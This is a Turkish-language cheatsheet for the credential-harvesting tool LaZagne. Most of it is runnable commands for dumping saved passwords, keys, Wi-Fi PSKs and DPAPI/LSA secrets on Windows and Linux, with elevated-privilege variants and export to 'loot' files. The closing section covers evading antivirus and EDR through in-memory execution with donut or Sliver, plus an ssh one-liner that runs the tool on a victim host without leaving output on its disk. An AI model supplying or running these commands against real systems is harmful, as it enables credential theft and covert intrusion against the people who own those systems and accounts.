# LaZagne Bilgi Notu (Cheatsheet)

[LaZagne](https://github.com/AlessandroZ/LaZagne), sızma testi sonrası (post-exploitation) hedef sistemde yerel olarak kayıtlı parolaları tespit edip ayıklayan açık kaynaklı bir kimlik bilgisi toplama aracıdır. Windows, Linux ve macOS işletim sistemlerinde tarayıcılar, SSH/RDP araçları, Wi-Fi ağları, veritabanı yöneticileri ve bellek önbelleklerinden şifreleri çeker.

---

## İçindekiler

- [Desteklenen Modüller & Kategoriler](#desteklenen-modüller--kategoriler)
- [Kurulum & Çalıştırılabilir Dosyalar](#kurulum--çalıştırılabilir-dosyalar)
- [Linux Sistemlerde Parola Ayıklama](#linux-sistemlerde-parola-ayıklama)
- [Windows Sistemlerde Parola Ayıklama](#windows-sistemlerde-parola-ayıklama)
- [Hedefe Yönelik Kategori Taramaları](#hedefe-yönelik-kategori-taramaları)
- [Çıktı Biçimleri & Dosyaya Aktarım](#çıktı-biçimleri--dosyaya-aktarım)
- [Operasyonel Güvenlik (OpSec) & EDR Atlatma](#operasyonel-güvenlik-opsec--edr-atlatma)

---

## Desteklenen Modüller & Kategoriler

LaZagne, farklı kategorilerdeki onlarca yazılımdan şifre çıkarabilir:
- **Tarayıcılar:** Chrome, Firefox, Edge, Opera, Brave, Chromium (otomatik tamamlama, geçmiş, çerezler, kayıtlı form şifreleri).
- **Sistem Yönetim Araçları:** WinSCP, PuTTY, OpenSSH (`id_rsa` anahtarları / config), RDP / mstsc, FileZilla, Cyberduck, VNC.
- **Veritabanı Yöneticileri:** DBeaver, pgAdmin, Squirrel, Robomongo, SQL Server Management Studio.
- **Wi-Fi Ağları:** İşletim sisteminde kayıtlı açık WPA2/WPA3 ön paylaşımlı anahtarları (PSK).
- **Yazılımcı & Versiyon Kontrol:** Git kimlik bilgileri (`.git-credentials`, cache), SVN, Docker token'ları, AWS CLI anahtarları.
- **E-Posta & Mesajlaşma:** Thunderbird, Outlook, Pidgin, Skype.
- **Windows DPAPI & Kasa:** LSA sırları, DPAPI master anahtarları, Credential Manager kasa kayıtları.

---

## Kurulum & Çalıştırılabilir Dosyalar

```bash
# Depoyu klonlayın
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZagne

# Python bağımlılıklarını kurun (Linux kaynak kodundan çalıştırma için)
pip install -r requirements.txt

# Veya derlenmiş hazır ikili (binary) dosyaları indirin (GitHub Releases)
# Windows: lazagne.exe
# Linux: laZagne.py
```

---

## Linux Sistemlerde Parola Ayıklama

### 1. Tüm Modülleri Çalıştırma
```bash
python3 laZagne.py all
```

### 2. Root / Sudo Yetkileriyle Çalıştırma (Kapsam Genişletme)
`root` ayrıcalıkları ile çalıştırıldığında sistem şifreleri, `/etc/NetworkManager` altındaki Wi-Fi profilleri ve tüm `/home/*` kullanıcılarının SSH anahtarları taranır:
```bash
sudo python3 laZagne.py all
```

### 3. Gnome Keyring / KWallet Şifrelerini Çekme
```bash
python3 laZagne.py sysadmin -k
```

---

## Windows Sistemlerde Parola Ayıklama

Windows ortamında bağımsız `lazagne.exe` dosyası kullanılır:

### 1. Tüm Kayıtlı Parolaları Listeleme
```cmd
lazagne.exe all
```

### 2. Yönetici (SYSTEM / Admin) Yetkisiyle Çalıştırma
DPAPI master anahtarlarını, LSA sırlarını ve önbelleğe alınmış etki alanı şifrelerini döker:
```cmd
lazagne.exe all -v
```

### 3. Belirli Bir Kullanıcının Dizinini Tarama
```cmd
lazagne.exe all -path "C:\Users\TargetUser\AppData"
```

---

## Hedefe Yönelik Kategori Taramaları

Tüm modülleri çalıştırmak yerine yalnızca ilgilenilen yazılım grubunu hedefleyerek disk aktivitesini ve gürültüyü azaltın:

### 1. Yalnızca Web Tarayıcıları
```bash
# Linux
python3 laZagne.py browsers

# Windows
lazagne.exe browsers
```

### 2. Kayıtlı Wi-Fi Parolaları
```bash
# Linux (root yetkisi gerektirir)
sudo python3 laZagne.py wifi

# Windows
lazagne.exe wifi
```

### 3. Sistem Yönetim ve Uzak Erişim (SSH, RDP, WinSCP, FileZilla)
```bash
# Linux
python3 laZagne.py sysadmin

# Windows
lazagne.exe sysadmin
```

### 4. Veritabanı İstemcileri
```bash
# Linux
python3 laZagne.py databases

# Windows
lazagne.exe databases
```

### 5. Geliştirici & Git Bilgileri
```bash
# Linux
python3 laZagne.py git
```

---

## Çıktı Biçimleri & Dosyaya Aktarım

Elde edilen kimlik bilgilerini yapılandırılmış dosya formatlarında diske yazın:

### JSON Formatında Dışa Aktarma
```bash
python3 laZagne.py all -oJ -oN /tmp/loot_credentials
```
Bu komut `/tmp/loot_credentials.json` dosyasını oluşturur.

### Düz Metin (TXT) Olarak Dışa Aktarma
```bash
python3 laZagne.py all -oT -oN /tmp/loot_credentials
```
Bu komut `/tmp/loot_credentials.txt` dosyasını üretir.

---

## Operasyonel Güvenlik (OpSec) & EDR Atlatma

- **Antivirüs İmzaları:** Hazır derlenmiş `lazagne.exe` ikilisi Windows Defender ve kurumsal EDR/XDR sistemleri tarafından doğrudan yakalanır.
- **Bellek İçi Çalıştırma (In-Memory Execution):**
  - Hazır exe yerine `donut` veya Sliver C2 içindeki `execute-assembly` modülü ile bellek içinde çalıştırın.
  - Linux ortamında PyInstaller ile paketlenmiş ikili yerine temiz bir Python sanal ortamında (venv) doğrudan `.py` dosyasını kullanın.
- **Disk İzi Bırakmama:** Çıktıları diske kaydetmek yerine SSH veya C2 tüneli üzerinden doğrudan saldırgan makineye yönlendirin:
  ```bash
  ssh kurban@192.168.1.50 'python3 -' < laZagne.py all
  ```
